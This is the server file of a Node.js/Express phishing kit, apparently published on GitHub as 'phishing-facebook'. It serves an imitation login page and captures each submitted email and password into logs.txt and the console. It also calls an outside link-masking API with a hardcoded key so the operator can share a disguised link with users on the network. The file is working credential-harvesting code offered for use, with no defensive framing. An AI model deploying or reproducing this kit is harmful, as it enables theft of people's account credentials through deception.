const express = require('express');
const exphbs = require('express-handlebars');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const os = require('os');
var port = process.env.PORT || 3000;
var networkInterfaces = os.networkInterfaces();

const app = express();

app.engine('handlebars', exphbs({ defaultLayout: 'main' }));
app.set('view engine', 'handlebars');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use('/images', express.static('images'));

app.get('/', function(req, res) {
    res.render('f_login');
});

app.post('/_', function(req, res) {
    res.render('f_success');
    var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`
    fs.appendFile('logs.txt', captured_content, err => {
        if (err) {
            console.error(err)
            return
        }
    });
    console.log(captured_content);
});

app.get('/images/eye-off.png', function(req, res) {
    res.sendFile(path.join(__dirname, './views/images/eye-off.png'))
});
app.get('/images/eye.png', function(req, res) {
    res.sendFile(path.join(__dirname, './views/images/eye.png'))
});
app.get('/images/favicon.png', function(req, res) {
    res.sendFile(path.join(__dirname, './views/images/favicon.png'))
});
app.get('/images/logo.png', function(req, res) {
    res.sendFile(path.join(__dirname, './views/images/logo.png'))
});
app.get('/images/check.png', function(req, res) {
    res.sendFile(path.join(__dirname, './views/images/check.png'))
});

app.listen(process.env.PORT || 3000, function() {
    console.log("Express server listening on port %d in %s mode", this.address().port, app.settings.env);
});

axios.get(`http://anoni4.cf/api?create&key=D03hVPibJRaxvXqmus8NAE7WC6n2KyfGcwI&link=http://${networkInterfaces.Ethernet[0].address}:${port}`).then(async res => {
    console.log(`[!] You can share this hidden link with your network users: ${res.data.Link}\n[!] If the link doesn't work. Try using your IPV4 + PORT: ${networkInterfaces.Ethernet[0].address}:${port}\n\n[+] Give this project a star on GitHub: https://github.com/pauloodev/phishing-facebook`)
});